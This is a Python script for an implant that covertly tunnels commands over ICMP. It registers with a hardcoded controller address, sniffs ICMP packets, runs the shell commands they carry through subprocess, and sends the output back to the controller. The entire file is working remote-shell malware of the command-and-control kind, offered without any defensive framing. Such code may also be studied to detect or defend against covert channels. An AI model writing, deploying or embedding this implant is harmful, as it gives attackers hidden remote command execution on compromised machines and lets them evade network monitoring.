#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
import shlex
from shellylib import Host
import time
from threading import Timer
from subprocess import STDOUT, check_output, TimeoutExpired, PIPE, Popen
import subprocess

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip
        

    def join(self, shellpack):
        self.send(shellpack['ip'], "join")

    def instruction(self, shellpack):
        try:
            cmd = shellpack['data'].decode()

            output = subprocess.run(cmd, shell=True, stderr=STDOUT, stdout=PIPE, timeout=3, capture_output = True)
            self.send(self.controller_ip, "instruction", output)
            
        except TimeoutExpired:
            self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
        except FileNotFoundError:
            self.send(self.controller_ip, "instruction", b'The command was not found', option="ERROR")
        except SyntaxError:
            self.send(self.controller_ip, "instruction", b'There was a syntax error in the command', option="ERROR")

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
